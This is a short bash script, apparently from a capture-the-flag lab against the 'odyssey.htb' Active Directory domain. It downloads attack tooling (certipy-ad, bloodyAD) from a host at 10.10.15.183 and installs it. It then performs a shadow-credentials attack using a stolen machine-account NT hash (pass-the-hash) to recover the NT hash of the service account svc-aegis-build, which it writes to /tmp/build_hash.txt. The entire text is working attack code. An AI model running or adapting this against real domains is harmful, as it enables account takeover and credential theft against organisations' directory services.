#!/bin/bash
set -e
HASH="71bc6be8565f0c9871070c3912b1680d"
cd /tmp
curl -fsSL -o adwheels.tgz http://10.10.15.183:8090/adwheels.tgz
mkdir -p adwheels && tar -xzf adwheels.tgz -C adwheels
pip3 install --user --break-system-packages --no-index --find-links=/tmp/adwheels certipy-ad bloodyAD 2>&1 | tee /tmp/pip_ad.log | tail -20
export PATH="$HOME/.local/bin:$PATH"
CERTIPY=$(command -v certipy-ad || command -v certipy || true)
echo "CERTIPY=$CERTIPY"
python3 -m certipy shadow auto -u "ODYSSEY-DB\$@odyssey.htb" -hashes ":$HASH" -account svc-aegis-build -dc-ip 172.16.0.10 2>&1 | tee /tmp/certipy_shadow.out
# fallback binary name
if ! grep -qi "NT hash" /tmp/certipy_shadow.out; then
  $CERTIPY shadow auto -u "ODYSSEY-DB\$@odyssey.htb" -hashes ":$HASH" -account svc-aegis-build -dc-ip 172.16.0.10 2>&1 | tee -a /tmp/certipy_shadow.out
fi
grep -i "NT hash" /tmp/certipy_shadow.out | tee /tmp/build_hash.txt
ping -c 1 -W 2 172.16.0.10 || true
